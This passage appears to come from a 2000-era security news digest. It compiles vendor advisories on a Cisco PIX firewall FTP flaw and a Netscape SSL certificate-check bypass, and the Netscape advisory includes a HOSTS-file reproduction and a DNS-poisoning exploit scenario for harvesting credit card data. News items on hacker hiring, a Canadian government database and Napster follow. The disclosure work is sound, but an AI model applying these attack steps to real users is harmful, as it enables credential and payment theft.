      Protocol) commands out of context and inappropriately opens temporary 
      access through the firewall.  This is an interim notice describing two 
      related vulnerabilities. The first vulnerability is exercised when the 
      firewall receives an error message from an internal FTP server containing 
      an encapsulated command such that the firewall interprets it as a distinct 
      command.  This vulnerability can be exploited to open a separate 
      connection through the firewall.  This vulnerability is documented as 
      Cisco Bug ID CSCdp86352. 

      The second vulnerability is exercised when a client inside the firewall 
      browses to an external server and selects a link that the firewall 
      interprets as two or more FTP commands.  The client begins an FTP 
      connection as expected and at the same time unexpectedly executes another 
      command opening a separate connection through the firewall.  This 
      vulnerability is documented as Cisco Bug ID CSCdr09226. 

      Either vulnerability can be exploited to transmit information through the 
      firewall without authorization. 

      Both vulnerabilities are addressed more completely in this updated interim 
      security advisory. 

      Who Is Affected       All users of Cisco Secure PIX Firewalls with 
      software versions up to and including 4.2(5), 4.4(4), and 5.0(3) that 
      provide access to FTP services are at risk from both vulnerabilities. 
      Cisco Secure PIX Firewall with software version 5.1(1) is affected by the 
      second vulnerability only. 

      Cisco Secure Integrated Software (formerly Cisco IOS® Software Firewall 
      Feature Set) is not affected by either vulnerability. 

      Impact       Any Cisco Secure PIX Firewall that has enabled the fixup 
      protocol ftp command is at risk of unauthorized transmission of data 
      through the firewall. Details The first vulnerability has been assigned 
      Cisco bug ID CSCdp86352. The second vulnerability has been assigned Cisco 
      bug ID CSCdr09226. The behavior is due to the command fixup protocol ftp 
      [portnum], which is enabled by default on the Cisco Secure PIX Firewall. 

      If you do not have protected FTP hosts with the accompanying configuration 
      (configuration example below) you are not vulnerable to the attack which 
      causes a server to send a valid command, encapsulated within an error 
      message, and causes the firewall to read the encapsulated partial command 
      as a valid command (CSCdp86352). 

      To exploit this vulnerability, attackers must be able to make connections 
      to an FTP server protected by the PIX Firewall.  If your Cisco Secure PIX 
      Firewall has configuration lines similar to the following: 

      
      fixup protocol ftp 21 and either conduit permit tcp host 192.168.0.1 eq 21 
      any or conduit permit tcp 192.168.0.1 255.255.255.0 eq 21 any

      It is possible to fool the PIX stateful inspection into opening up 
      arbitrary TCP ports, which could allow attackers to circumvent defined 
      security policies.       If you permit internal clients to make arbitrary 
      FTP connections outbound, you may be vulnerable to the second 
      vulnerability (CSCdr09226).  This is an attack based on CERT advisory 
      CA-2000-02: Malicious HTML Tags Embedded in Client Web Requests 
      http://www.cert.org/advisories/CA-2000-02.html  and detailed in the 
      BUGTRAQ post: "Extending the FTP 'ALG' vulnerability to any FTP client" 
      http://www.securityfocus.com/templates/archive.pike?list=82&date=2000-03-0
      8&msg=38C8C8EE.544524B1@enternet.se 

      The recommendation in the workarounds section of this document will 
      provide protection against this vulnerability. 

      
      Response for the first vulnerability (CSCdp86352) The following changes 
      have been made to the "fixup protocol FTP" behavior of the PIX Firewall: 
      Enforce that only the server can generate a  reply indicating the PASV 
      command was accepted. Enforce that only the client can generate a PORT 
      command. Enforce that data channel is initiated from the expected side in 
      an FTP transaction. Verify that the "227" reply code and the PORT command 
      are complete commands and not part of a "500" error code string broken 
      into fragments. Enforce that the port is not 0 or in the range between 
      [1,1024] These or equivalent changes will be carried forward into all PIX 
      Firewall software versions after version 5.1(1). 

      Response for the second vulnerability (CSCdr09226)       We have added an 
      additional command keyword to address this problem: 

      fixup protocol ftp [strict] <port1>[-<port2>]       The "strict" keyword 
      directs the fixup protocol ftp command to maintain strict command state, 
      and may impact some FTP features such as command pipelining or command 
      grouping. This will be fixed in version 5.1(2) and subsequent versions, as 
      well as in version 4.4(5). 

      Software Versions and Fixes       Getting Fixed Software Cisco is offering 
      free software upgrades to remedy this vulnerability for all affected 
      customers. Customers with service contracts may upgrade to any software 
      version. Customers without contracts may upgrade only within a single row

      Customers with contracts should obtain upgraded software through their 
      regular update channels. For most customers, this means that upgrades 
      should be obtained via the Software Center on Cisco's Worldwide Web site 
      at http://www.cisco.com/. 

      Customers without contracts should get their upgrades by contacting the 
      Cisco Technical Assistance Center (TAC). TAC contacts are as follows: 

      +1 800 553 2447 (toll-free from within North America)       +1 408 526 
      7209 (toll call from anywhere in the world) e-mail: tac@cisco.com Give the 
      URL of this notice as evidence of your entitlement to a free upgrade. Free 
      upgrades for non-contract customers must be requested through the TAC. 
      Please do not contact either "psirt@cisco.com" or 
      "security-alert@cisco.com" for software upgrades. 

      Hardware requirements       If version 4.3 or 4.4 is utilized on a PIX 
      'Classic' (excludes PIX10000, PIX-510, PIX-520, and PIX-515) or 

      If version 5.0 is utilized on a PIX 'Classic', PIX10000, or PIX-510 
      (excludes PIX-520 and PIX-515) 

      A 128MB upgrade for the PIX Firewall is necessary.  As with any new 
      software installation, customers planning to upgrade should carefully read 
      the release notes and other relevant documentation before beginning any 
      upgrade. Also, it is important to be certain that the new version of Cisco 
      Secure PIX Firewall software is supported by your hardware, and especially 
      that enough memory is available. 

      Workarounds       The behaviors described in this document are a result of 
      the default command fixup protocol ftp [portnum].  To disable this 
      functionality, enter the command no fixup protocol ftp.  This will disable 
      support of the fixup of the FTP protocol in the PIX, and will eliminate 
      the vulnerabilities.  The command fixup protocol ftp 21 is the default 
      setting of this feature, and is enabled by default on the Cisco Secure PIX 
      Firewall. This workaround will force your clients to use FTP in passive 
      mode, and inbound FTP service will not be supported.  Outbound standard 
      FTP will not work without fixup protocol ftp 21, however, passive FTP will 
      function correctly with no fixup protocol ftp configured. 

      
      Exploitation and Public Announcements This vulnerability was proposed on 
      the BUGTRAQ list, and in follow-ups to the article, the Cisco Secure PIX 
      Firewall was also identified as susceptible.  As the vulnerabilities have 
      been widely discussed, Cisco is posting this advisory prior to having a 
      full fix.  We will update this notice again, when we have a full fix 
      available. Cisco has had no reports of malicious exploitation of this 
      vulnerability.  However, versions of exploit scripts have been posted to 
      various security related lists. 

      This vulnerability was reported to Cisco via several sources, shortly 
      after the time of the original supposition.

      SUMMARY
      =======
      
      Our team has discovered a flaw in Netscape Navigator that allows bypassing
      of warning about an invalid SSL certificate. SSL protection is used in most
      major Internet-based financial services (e-banking, e-commerce). The flaw
      we have found effectively disables one of the two basic SSL functionalities:
      to assure users that they are really communicating with the intended web
      server - and not with a fake one.
      Using this flaw, the attacker can make users send secret information (like
      credit card data and passwords) to his web server rather than the real one -
      EVEN IF THE COMMUNICATION IS PROTECTED BY SSL PROTOCOL.
      
      
      INTRODUCTION (skip this section if you already understand how SSL works)
      ============
      
      When a web browser tries to connect to a SSL-protected server, a so-called
      SSL session is  established. At the beginning of this session the server
      presents his SSL certificate containing his public key. At this point,
      browser checks the certificate for the following conditions (*):
      
      1) Certificate must be issued by a certificate authority trusted by browser
      (some are default: Verisign, Thawte etc.)
      2) Certificate must not be expired (its expiry date:time must be later than
      the current system date:time on the computer browser is running on)
      3) Certificate must be for the server that browser is connecting to (if
      browser is connecting to www.e-bank.com, the certificate must be for
      www.e-bank.com)
      
      All three conditions must be met for browser to accept the certificate. For
      every condition not met, browser should display a warning to the user and
      then user can decide whether connection should be established or not.
      These three conditions combined provide user with assurance that his browser
      is really connecting to the correct server and not to some fake server
      placed on the Internet by malicious individual(s) trying to trick users to
      give them credit card information, passwords and other secret information.
      
      For example, let's take a look at a sample web e-banking system that doesn't
      use SSL certificates and requires one-time password tokens for user
      authentication. User connects to http://www.e-bank.com. Browser asks DNS
      server for IP address of www.e-bank.com and gets 100.100.100.100. Browser
      then connects to 100.100.100.100 and user is presented with login form
      asking for his username and one-time password. He enters this data and
      starts using e-banking services.
      A simple attack (called web-spoofing) on this system is to attack the DNS
      server and "poison" its entry for www.e-bank.com with attacker's IP address
      99.99.99.99. Attacker sets up a web server at 99.99.99.99 that web-wise
      looks exactly like the original www.e-bank.com server. User trying to
      connect to www.e-bank.com will now instead connect to the attacker's server
      and provide it with his one-time password. Attacker's server will use this
      password to connect to the real server at 100.100.100.100 and transfer all
      of the user's money to his secret Swiss bank account ;-).
      
      This attack is successfully disabled by using SSL protocol. In that
      case, when browser falsely connects to www.e-bank.com at 99.99.99.99 rather
      than to 100.100.100.100, attacker's server must provide a valid certificate
      for www.e-bank.com, which it can't unless the attacker has stolen the secret
      key and the certificate from the real server. Let's look at three
      possibilities:
      
      1) Attacker could issue a certificate for www.e-bank.com himself (on his own
      CA). That wouldn't work since his CA is not trusted by user's browser.
      2) Attacker could use a stolen expired key and certificate (those are often
      not protected as strongly as valid ones since one could think they can't
      be used any more). That wouldn't work since browser will notice that
      certificate is expired.
      3) Attacker could use a valid key and certificate for some other site (e.g.
      www.something.org). That wouldn't work since browser will accept only
      valid certificates for www.e-bank.com.
      
      It would seem that this problem of web-spoofing is successfully solved with
      SSL certificates.
      
      
      PROBLEM
      =======
      
      There is a flaw in implementation of SSL certificate checks in Netscape
      Navigator.
      
      
      The Flaw
      --------
      
      Netscape Navigator correctly checks the certificate conditions (*) at the
      beginning of a SSL session it establishes with a certain web server.
      The flaw is, while this SSL session is still alive, all HTTPS
      connections to *THAT SERVER'S IP ADDRESS* are assumed to be a part of this
      session (and therefore certificate conditions are not checked again).
      Instead of comparing hostnames to those of currently open sessions, Navigator
      compares IP addresses. Since more than one hostname can have the same IP
      address, there is a great potential for security breach.
      This behavior is not in compliance with SSL specification.
      
      
      DEMONSTRATION
      =============
      
      The following will try to demonstrate the flaw. It is assumed that for
      redirecting user's web traffic, the attacker will generally use "DNS
      poisoning" or reconfiguring routers, while in our demonstration we will
      use the HOSTS file on client computer to get the same effect and make it
      easier to reproduce the flaw.
      
      In this demonstration, we will make Navigator open Thawte's homepage over
      secure (HTTPS) connection while requesting Verisign's home address at
      https://www.verisign.com.
      Thawte's and Verisign's homepages are used as examples - this would work
      just the same on any other secured web sites.
      
      1) First, add the following line to the local HOSTS file on the computer
      running the Navigator and save it:
      
      207.240.177.177 www.verisign.com
      
      This will make the computer (and, consequently, the browser) think that IP
      address of www.verisign.com (which is actually 205.139.94.60) is in fact
      207.240.177.177 (which is actually IP address of www.thawte.com).
      
      At this point it is important to note that SSL, if correctly implemented,
      provides protection against such "domain name spoofing", because while the
      browser will connect to the wrong server, that server will not be able to
      provide a valid SSL certificate and the SSL session will not be
      established (not without user being warned about the certificate).
      
      2) Close all instances of Navigator to clean any cached IP addresses.
      
      3) Open Navigator and go to https://www.thawte.com. It works as it should -
      Thawte's server provides a valid SSL certificate for its hostname
      (www.thawte.com) and so the SSL session is established.
      
      4) With the same instance of Navigator, go to https://www.verisign.com. Now
      watch the Thawte's homepage appear again WITHOUT ANY WARNINGS!
      
      What happened here? In step 3), Navigator looked up the IP address for
      www.thawte.com (from the DNS server) and found 207.240.177.177. It tried to
      establish a SSL session with that IP address and correctly checked all three
      certificate conditions (*) - indeed, if any of them weren't true, a warning
      would pop up.
      In step 4), Navigator looked up the IP address for www.verisign.com (this
      time from HOSTS file, but it could easily have been from the same DNS server)
      and found again 207.240.177.177. Now, since there was already one SSL session
      open with that IP address, Navigator *INCORRECTLY* decided to use that
      session instead of establishing another one.
      
      
      EXPLOIT
      =======
      
      This exploit will show how the flaw could be used to gather user's secret
      information.
      
      Assume there is a web bookstore at www.thebookstore.com. Users go to
      http://www.thebookstore.com (via normal HTTP connection), browse the
      books and add them to their virtual shopping baskets. At the check-out,
      they are directed to a secure order form (e.g.
      https://www.thebookstore.com/order_form.html) where they enter their
      personal and credit card information which is then submitted (again via
      secure HTTPS connection) to the server. This is a typical web e-commerce
      concept.
      Assume that IP address of www.thebookstore.com is 100.100.100.100.
      
      The attacker sets up his own web server with IP address 99.99.99.99 and
      installs on it a valid SSL certificate for host www.attacker.com (he could
      have purchased this certificate from e.g. Verisign if he owns the domain
      attacker.com; he could have stolen the certificate or he could have broken
      into a web server with a certificate already installed).
      The attacker makes this web server function as a gateway to
      www.thebookstore.com - meaning that all requests are forwarded to
      www.thebookstore.com, so virtually this server "looks and feels" exactly like
      the real www.thebookstore.com. There is just one difference: the page before
      the order form (e.g. http://www.thebookstore.com/basket.html)
      contains a small (1x1) image originating from https://www.attacker.com
      (secure HTTPS connection).
      
      Then, the attacker "poisons" a heavily used DNS server so that it will return
      99.99.99.99 for requests about www.thebookstore.com (normally it returns
      100.100.100.100).
      
      What happens then?
      
      All users of that DNS server who will try to visit (via normal HTTP)
      http://www.thebookstore.com will connect to 99.99.99.99 instead of
      100.100.100.100 but will not notice anything because everything will look
      just the way it should. They will browse the books and add them to their
      shopping baskets and at check-out, they will be presented with the order form
      https://www.thebookstore.com/order_form.html.
      But the previous HTML page containing the hyperlink to the order form will
      also contain a small (1x1) image with source https://www.attacker.com/a.gif.
      Navigator will successfully download this image and for that it will
      establish a SSL session with www.attacker.com. This session then stays open.
      When the order form is accessed, Navigator tries to establish another SSL
      session, this time to www.thebookstore.com. Since DNS server claims this
      server has the same IP address as www.attacker.com (99.99.99.99), Navigator
      will use the existing SSL session with 99.99.99.99 and will not check the
      certificate.
      The result: Navigator is displaying a SECURE ORDER FORM that it believes to
      be originating from the genuine server www.thebookstore.com while in fact
      it is originating from the fake one. No warning about an invalid certificate
      is issued to the user so he also believes to be safe.
      When user submits his secret information, it goes to (through) the attacker's
      server where it is collected for massive abuse.
      For users to notice the foul play they would have to look at the certificate
      properties while on a "secure" page https://www.thebookstore.com/...
      The properties would show that the certificate used was issued for host
      www.attacker.com.
      Also, monitoring network traffic would show that the server is not at
      100.100.100.100 where it should be but rather at 99.99.99.99.
      
      It is a very rare practice to check any of these when nothing suspect is
      happening.
      
      
      Notes
      -----
      
      It should be noted that in the previous exploit, if the users tried to
      access https://www.thebookstore.com over secure (HTTPS) connection from
      the very start, Navigator would issue a warning. It is imperative for the
      exploit to work that some time *before* the first secure connection to
      https://www.thebookstore.com a successful secure connection is made to
      https://www.attacker.com. That's why a valid certificate must be installed
      on www.attacker.com.
      
      Also, it should be noted that Navigator's SSL sessions don't last forever.
      We haven't been able to predict the duration of these sessions
      (it seems to be depending on many things like inactivity time, total time
      etc.) and we also haven't investigated the possible effects of SSL
      session resuming.
      
      
      SOLUTION
      ========
      
      Netscape has (even prior to our notification - see the Acknowledgments
      section) provided a Navigator Add-on called Personal Security Manager (PSM),
      freely downloadable at:
      
      http://www.iplanet.com/downloads/download/detail_128_316.html
      
      Installation of PSM, as far as we have tested it, corrects the identified
      flaw.
      
      Netscape Communicator (v4.73) currently includes the fix for this
      vulnerability. It is available for download at:

      ==========
      
      Navigator/Communicator users who can't or don't want to install PSM can use
      a "manual" method to make sure they are not under attack:
      
      When visiting an SSL-protected site, double click on the lock icon (bottom
      left corner) or the key icon (in older browsers) and see whether the
      certificate used for the connection is really issued for the correct
      hostname. E.g. If you visit https://www.verisign.com, make sure the
      certificate used is issued for www.verisign.com and not for some other
      hostname.
      
      
      ADVISORY
      ========
      
      It is important to emphasize that the flaw presented completely compromises
      SSL's ability to provide strong server authentication and therefore poses
      a serious threat to Navigator users relying on its SSL protection.
      
      
      Users of web services
      ---------------------
      
      Netscape Navigator/Communicator users who are also users of any critical web
      services employing Secure Sockets Layer (SSL) protection to provide secrecy
      and integrity of browser-server communication are strongly advised to
      install Personal Security Manager or upgrade to Communicator 4.73 and thus
      disable this vulnerability.
      
      Main examples of such critical web services are:
      
      - web banking systems (especially the ones using passwords for
      authentication - even one-time passwords),
      - web stores (especially the ones accepting credit card data) and
      - other web-based e-commerce systems.
      
      
      Providers of web services
      -------------------------
      
      Providers of critical web services employing Secure Sockets Layer (SSL)
      protection to provide secrecy and integrity of browser-server communication
      should advise their users to install Personal Security Manager or upgrade to
      Communicator 4.73 and thus disable this vulnerability.
      
      Since this vulnerability allows for the type of attack that can completely
      bypass the real/original web server, there are no technical countermeasures
      which providers of web services could deploy at their sites.
      
      
      Web services using client SSL certificates for user authentication
      ------------------------------------------------------------------
      
      This vulnerability does NOT allow the attacker to steal client's SSL key
      and thus execute the man-in-the-middle attack on web services using client
      SSL certificates for user authentication. It still does, however, allow
      the attacker to place a fake server (an exact copy) and collect other
      information users provide (including the data in their client SSL
      certificates).

      II. Impact
      
      Attackers can trick users into disclosing information (potentially 
      including credit card numbers, personal data, or other sensitive 
      information) intended for a legitimate web site, even if that web
      site uses SSL to authenticate and secure transactions. 
      
      III. Solution
      
      Install an update from your vendor. 
      
      Appendix A lists information from vendors about updates.
      
      If you are a DNS administrator, maintain the integrity of your DNS 
      server
      
      One way to exploit this vulnerability, described above, relies on the 
      ability of the attacker to compromise DNS information. If you are a 
      DNS administrator, making sure your DNS server is up-to-date and free
      of known vulnerabilities reduces the ability of an intruder to execute
      this type of attack. Administrators of BIND DNS servers are encouraged
      to read 
      
      http://www.cert.org/advisories/CA-2000-03.html 
      
      Validate certificates at each use
      
      Despite the existence of this flaw, it is still possible to guard 
      against attempted attacks by validating certificates manually each
      time you connect to an SSL-secured web site. Doing so will substantially
      reduce the ability of an attacker to use flaws in the DNS system to 
      bypass SSL-authentication.

213.0 [MM] IBM will only hire immitation hackers
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

     May 16, 2000
     IBM will only hire immitation hackers
                
     David Binney, director of corporate security for IBM stated, "IBM would never consider hiring a
     reformed hacker. It would be like hiring a burglar to institute a burglar system in your house. You
     wouldn't do it." When Lewis Koch, a journalist with ZDNET UK, attempted to ascertain if there
     were any ulterior motives for the statement, Binney backed out of the interview. Read the entire
     story (below). Thanks to Jane Oliver at ZDNET for the submission.

              What the hack did he say?
              "IBM would never consider hiring a reformed
              hacker. It would be like hiring a burglar to
              institute a burglar system on your house. You
              wouldn't do it." So said David Binney, director of
              corporate security at IBM, in Solar Sunrise, a
              video produced last year by the Federal Bureau of
              Investigation and the National Infrastructure
              Protection Center, ostensibly to deter people from
              hacking. 

                                        By Lewis Z. Koch


      In Binney's view, hackers, like burglers, break in with the intent to
      steal. IBM won't hire you, he said, and neither will any responsible
      computer security firm. Hack and you'll never work in this town again.
      
      
      Don't believe it, Binney. The town and the times are a-changin'. 
      
      Testing the thesis 
      
      A number of top-tier, high-profile firms feel differently about hackers.
      Evidence? Look at the recent joint venture among a group of hackers
      known as the L0pht, Compaq Computer and Forrester Research that
      involves $10 million in venture capital. There's nothing "reformed"
      about the L0pht; members wear the mantle of hacker proudly, says
      Space Rogue, a L0pht member in good standing. 
      
      Although not a hacker, reformed or otherwise, Steve Lutz,
      president of WaySecure Consulting, hires reformed hackers. His
      company offers a full range of computer security consulting, including
      evidence gathering, risk assessment, security testing and training.
      Among the hundreds of clients he and his hackers have served are
      Chase Manhattan, American Express, Morgan Stanley Dean Witter,
      insurance giant Transamerica, TIAA-CREF, the U.S. Navy and the
      U.S. Army - organisations with serious items to protect: money,
      stocks, bombs. 
      
      "I hired several hackers," Lutz says, "the most famous, perhaps
      notorious, being Mark Abene, a.k.a. Phiber Optik. I brought Mark into
      the security consulting world by hiring him when he was released
      from prison. He worked for me for about two years and then started
      his own company, called Crossbar Security. Mark is a perfect
      example of the nation's most feared hacker turning around and
      providing a valuable service to the commercial sector and reaping the
      rewards that go with it." 
      
      Lutz says hiring hackers as consultants can be "highly rewarding.
      This is true for both the clients we serve and... the hackers
      themselves. Many young, talented hackers are bored and looking for
      something to do. By providing them with a constructive objective and
      rewarding them monetarily, we help focus them in a positive direction
      that keeps them busy and out of trouble." 
      
      The idea, as Lutz sees it, is to manage them and teach them
      business skills, not banish or outlaw them. 
      
      Inquiring minds 
      
      Could Binney have had an ulterior motive for his statement? IBM has
      what it calls an "ethical hackers" unit that will, for $15,000 to
      $40,000, according to the company, "simulate a real intruder's
      attack, but in a controlled, safe way." IBM's Internet Security
      Assessments, for $40,000 to $200,000, will tell companies if their
      Web sites are vulnerable and, if so, shore the sites up. 
      
      I asked computer security people all over the Net what they would
      like me to ask Binney. But after initially agreeing to an interview on
      Feb. 8, Binney changed his mind and has since been unavailable for
      comment, despite numerous phone calls, messages and e-mails. 
      
      The questions, though, have value in themselves...
      
      Carole Fennelly is a security consultant and partner at Wizard's
      Keys, a Tinton Falls, N.J., consulting company specializing in
      computer systems security. Fennelly had three sets of questions: 
      
         1.If IBM doesn't use hackers for penetration tests, then what is
           so special about its test? If it is merely testing for known
           vulnerabilities using a package like ISS Scanner [which
           uncovers vulnerabilities likely to be exploited during attempts
           to attack a network and provides the necessary corrective
           actions], why should a company pay big bucks for that? Why
           couldn't companies just run the scan themselves? 
      
         2.Has IBM ever encountered a site with really iron-clad
           security? If so, what did IBM put in the report? IBM can
           answer that one without naming the company, just as
           physicians mask the identities of their patients, while still
           providing the data necessary for studies. 
      
         3.When IBM makes recommendations, does it refer the client to
           a vendor with which it has a partnership? Does it offer to do
           the work itself? They're not using the audit as a marketing
           opportunity, are they? Audits can be legitimate opportunities
           for a company to prove its worth to the client. It can also
           become a con job targeting overworked and understaffed
           technical administrators. 
      
      Sage security advice 
      
      Matthew G. Devost, a senior information security analyst at Security
      Design International, a firm providing security consulting services to
      international corporations and governments, warns against using
      large firms that offer prepackaged security solutions. "With large
      consulting or product companies, the security consulting team is
      often used as a mechanism for pushing other products or services,"
      Devost says. 
      
      He also cautioned against an assessment team that benefits from
      future product sales or follow-up implementation support. "Pay close
      attention to methodology," Devost says. "If a company offers a quote
      without first understanding your network, their assessment can't
      really be trusted." 
      
      Other things that don't bode well, Devost says, are the use of a
      single commercial product or reliance on assessment tools. 
      
      Devost says customers should check the qualifications of the
      security team. "Will the names provided be directly involved in your
      assessment? Beware the bait-and-switch technique, where a team of
      senior security engineers is offered up, but replaced by a team of
      recent college graduates at the last minute." 
      
      Cast a wide net, Devost says. "There are a hundred reasons why
      you should avoid using a large consulting company to perform a
      security assessment... [which] will become apparent only when you
      broaden the spectrum of firms you solicit for quotes. Pay very close
      attention to the technical substance of their proposals." 
      
      So, contrary to what Binney said, with all the problems around the
      Internet - denial-of-service attacks out of nowhere, computer
      malfunctions and software vulnerabilities - there is a growing market
      for reformed hackers, one that's lucrative and fun and, best of all,
      legal.

      Huge data bank worries privacy watchdog
 
             By SEAN DURKAN, OTTAWA BUREAU
      OTTAWA --  Big Brother is watching you. 
 
      The federal government has "a de facto citizen profile" on virtually
      everyone living in Canada, Privacy Commissioner Bruce Phillips
      revealed yesterday. 
 
      The massive data bank, which is vulnerable to misuse, is run by
      Jane Stewart's Human Resources and Development Canada --
      the same department under fire for its handling of $1 billion in job
      grants. 
 
      The data bank contains as many as 2,000 pieces of information on
      each of 33.7 million individuals, Phillips said in his annual report to
      Parliament. 
 
      The dossier, which tracks Canadians from cradle to grave and is
      never purged, includes information about each person's education,
      marital status, ethnic origin, mobility, disabilities, income tax,
      employment and welfare history. 
 
      TAX RETURNS 
 
      The information is taken from income tax returns, child tax
      benefits, immigration and welfare files, the National Training
      Program, Canadian Job Strategy, employment services,
      employment insurance, job records and the social insurance
      master file. 
 
      "Continually centralizing and integrating so much personal data on
      almost every person in Canada poses significant risks to our
      privacy," Phillips said. 
 
      Privacy is further endangered because the information can be
      given out to non-government researchers, Phillips said. 
 
      Most Canadians would be surprised to know their tax returns can
      be shared in this way, he said. 
 
      HRDC's files are not subject to laws preventing the public release
      of any individual's information. 
 
      Phillips said the database is "a hazard" because it creates a
      temptation for governments to develop profiles, "raising fears that
      data could be used to make decisions or predictions about
      individuals ... to the detriment of individual rights." 
 
      ASSURANCES 
 
      Privacy commissioners have always assured Canadians there was
      no such central file. An audit which began two years ago has
      proved them wrong and Canadians should be concerned, Phillips
      said. 
 
      The "extraordinarily detailed" central databank is called the
      Longitudinal Labour Force File. 
 
      There are proposals to make the file even more comprehensive by
      adding data on social assistance recipients from additional
      provinces and territories, and data from the Canada Student Loan
      Program, the Canada Pension Plan and the Old Age Security
      Program. 
 
      The central file has gradually built up with government
      reorganization, which has turned HRDC into "a virtual behemoth"
      that has taken over numerous social, employment and training
      programs from other departments. 
 
      Phillips said HRDC has responded to his concerns by saying the
      data is vital to help it develop policy, manage the effectiveness of
      its "interventions" and improve programs and service delivery.

      Vast database details every
      Canadian's life
 
      Federal watchdog says some files hold 2,000
      bits of information
 
      Ian MacLeod
      The Ottawa Citizen
 
      The federal government has
      quietly created a massive
      computer database with
      intimate details about millions
      of Canadians, including
      income, employment,
      education and family status,
      federal Privacy Commissioner
      Bruce Phillips revealed
      yesterday. 
 
      "This is an enormous database
      with enormous amounts of
      information about each one of
      us," the nation's chief privacy
      watchdog said following the
      release of his annual report to
      Parliament on the state of personal privacy in Canada. 
 
      "Every one of us is covered in this file in one way or another. They have a
      complete record of you if you've had any contact anywhere with any (of a
      number of government departments and programs) ... which tells them how
      your life is progressing." 
 
      The Longitudinal Labour Force File, managed by Human Resources
      Development Canada, contains detailed data on 33.7 million living and dead
      Canadians. Some individual files contain as many as 2,000 bits and pieces of
      vital personal information, Mr. Phillips said. 
 
      The labour file was established about 15 years ago by Employment and
      Immigration Canada and is used to research and evaluate the effectiveness of
      the federal employment insurance program. 
 
      The information is gleaned from other government data banks and includes
      details from tax returns, child tax benefit files, provincial and municipal
      welfare files, federal jobs, job training and employment programs and
      services, employment insurance files and the social insurance master file. 
 
      Mr. Phillips said there are proposals to expand the file to include additional
      data on social assistance recipients from provinces and territories, the
      Canada Student Loan Program, the Canada Pension Plan and Old Age
      Security Program. 
 
      "Successive privacy commissioners have assured Canadians that there was
      no single federal government file, or profile about them," said Mr. Phillips.
      "We were wrong -- or not right enough for comfort. 
 
      "I don't question that they had, and they have, good reasons for doing this
      and that it is useful information in terms of improving the quality of their
      programs. I am not suggesting either that they've done anything unlawful
      here. They are complying with the strict letter of the law as we understand it. 
 
      "But there are serious problems here." 
 
      Although an HRDC Web site contains a brief description about the labour
      file, Mr. Phillips said much more has to be done to let Canadians know
      about the extent of the government's surveillance of its citizens.
      "Transparency and knowledge about what the government is doing is
      important." 
 
      A senior HRDC official yesterday defended the file and said the department
      has been trying to address Mr. Phillips' concerns, including agreeing to purge
      individual data from the file after 25 years. 
 
      "We have taken his concerns seriously," said Bob Wilson, HRDC's
      director-general of evaluation and data development. "We're not unmindful
      of the privacy concerns surrounding the database. 
 
      "On the other hand, it's really important to Canadians that we do policy
      research and evaluation so that we can get programs that meet their needs.
      So, as in all of these thorny public policy issues, there's a saw-off about
      where do you draw the line in respect of that." 
 
      He said specific information in the database is electronically masked to hide
      an individual's identity and that only a handful of HRDC officials have access
      to the technological hardware needed to unmask the data. He acknowledged
      the masked data is sometimes given to private firms for research and
      analysis. 
 
      "We're concerned about maintaining the privacy of individuals and we've
      done a large number of things to protect that," said Mr. Wilson. "We,
      perhaps not wisely, but nevertheless, have relied on the fact that we've been
      doing this for 15 years and never had a problem with it, never had even a
      hint of a (security) breach." 
 
      Mr. Phillips said he has no reason to believe current government officials are
      abusing the information contained in the file, though he questions what future
      officials might do and whether any officials really need all of the information
      the file contains. 
 
      In effect, he said, the government is compiling a de facto profile of virtually
      every citizen in Canada. 
 
      "My problem here is ... the Privacy Act at the moment is insufficient to
      prevent these kinds of informational collections," he said. "The Canadian
      public believes, for example, that when they send their tax information, it
      doesn't go out of the tax department. Well, in fact, it does, many times and
      to many places. There's something like 200 informational exchange
      agreements between Revenue Canada and various other agencies, plus other
      governments." 
 
      In the two years since the Office of the Privacy Commissioner found out
      about the labour file, Mr. Phillips said he has tried, unsuccessfully, to
      persuade HRDC officials to enact legislation to control the collection,
      handling and access to the information. 
 
      "I said years ago, the fear is not Big Brother, it's thousands of little brothers,
      all of whom have" increasing technological ability to monitor the personal
      lives of Canadians. 
 
      "But there is a Big Brother factor as well, and I think the Longitudinal Labour
      Force File is an example of the kind of thing that modern technology makes
      possible. We should know about it. We should know they're doing it and
      they should have to do it under very tightly written legal restraints about the
      usage of that information." 
 
      But Mr. Wilson said HRDC officials believe current laws and regulations
      offer many of the protections Mr. Phillips wants. 
 
      "We really need to sit down with him to find out exactly what he would like
      us to do by way of legislative framework," he said.

216.0 [MM] Napster gets tough with Metallica
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

      Napster gets tough with Metallica fans
 
      A Napster message board goes dark after a user posts a hack for banned users.
      It was either that or go out of business, a company insider said. 
 
 
      By Marilynn Wheeler, ZDNet News
      May 12, 2000 5:11 AM PT 

      Banned Napster users who figured out a way to get back onto the music download
      site were foiled late Thursday when instructions were removed from a Napster 
      message board.
      
      The "Circumventing Napster Bans" user forum was shut down and in its place 
      was a warning from the company after ZDNet News published a link to the forum.

      "Any posts regarding the circumvention of bans placed by Napster will be 
      deleted and the username will be banned," Napster told visitors to the forum.
      "The IP will be logged, and a second offense will trigger an IP ban on the 
      individual's account."

      "The Napster discussion boards are moderated, and they have a policy of 
      removing any user posts related to working around the user blocks regarding
      Metallica," said Napster spokesman Dan Wool. 

      Doing battle online
      
      Last week Metallica, which is suing Napster for copyright violation, produced
      the names of hundreds of thousands of fans who had traded the band's music 
      online. Napster responded by banning 317,377 users on Wednesday.

      The ostracized fans complained they'd been tricked into downloading the latest
      version of Napster, which had installed tracking identification on their 
      computers. Within hours, a way to get back online was posted in a Napster forum.

      A user who asked not to be identified protested in an Internet Relay Chat with
      one of Napster's developers. 

      "(The instructions) went down because our PR firm told us to take them down,"
      said the developer, identified as "nocarrier." "Having that information on our
      boards gives the impression to the world that we support the removal of our lock."

      Crying censorship
      
      "So it was removed," replied the user, "MindRape." "But that's censorship."

      It's called protecting your company, the developer said. "We will GO OUT OF
      BUSINESS for s--- like that! Delete the post, or lose the court battle, and
      you lose your napster! This is reality man!"

      "You had to do certain things to show you applied effort, but to CENSOR,"
      the user replied. "I dunno man, I think that's Orwellian. Well, good luck."

      "Thanks. We need it," the developer replied.

217.0 [IND] The Slashdot DDoS attack: What happened?
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     
      Contributed by GTO (http://www.g-t-online.com/)
           
      http://slashdot.org/article.pl?sid=00/05/17/1318233&mode=thread
      
      Posted by CmdrTaco on Wednesday May 17, @10:00AM
